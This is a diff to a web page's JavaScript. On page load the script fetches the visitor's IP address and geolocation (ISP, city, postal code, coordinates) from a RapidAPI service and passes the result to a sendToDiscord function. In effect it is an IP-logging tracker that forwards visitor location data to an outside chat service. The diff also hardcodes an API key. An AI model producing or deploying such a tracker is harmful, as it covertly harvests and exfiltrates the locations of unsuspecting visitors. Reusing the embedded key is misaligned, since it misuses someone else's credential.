@@ -1,7 +1,10 @@
 document.addEventListener('DOMContentLoaded', () => {
-  fetch('https://cors-anywhere.herokuapp.com/https://ipapi.co/json/')
-    .then(response => response.json())
-    .then(data => {
+  const xhr = new XMLHttpRequest();
+  xhr.withCredentials = true;
+
+  xhr.addEventListener('readystatechange', function () {
+    if (this.readyState === this.DONE) {
+      const data = JSON.parse(this.responseText);
       const ipAddress = data.ip;
       const currentDateTime = new Date();
       const dateTimeString = currentDateTime.toLocaleString();
@@ -12,11 +15,20 @@ document.addEventListener('DOMContentLoaded', () => {
           const message = createMessage(ipAddress, dateTimeString, geoData);
           sendToDiscord(message);
         })
+        .catch(error => console.error(error));
 
       document.getElementById('ip-address').textContent = `IP Address: ${ipAddress}`;
       document.getElementById('datetime').textContent = `Date and Time: ${dateTimeString}`;
-    })
+    }
+  });
+
+  xhr.open('GET', 'https://telize-v1.p.rapidapi.com/geoip');
+  xhr.setRequestHeader('X-RapidAPI-Key', 'c473c77058mshaf8601016a529b7p1edb2ajsn7f89360478b3');
+  xhr.setRequestHeader('X-RapidAPI-Host', 'telize-v1.p.rapidapi.com');
+
+  xhr.send();
 });
+
 
 function createMessage(ipAddress, dateTimeString, geoData) {
   const { ip, isp, country_name, region, city, postal, latitude, longitude } = geoData;
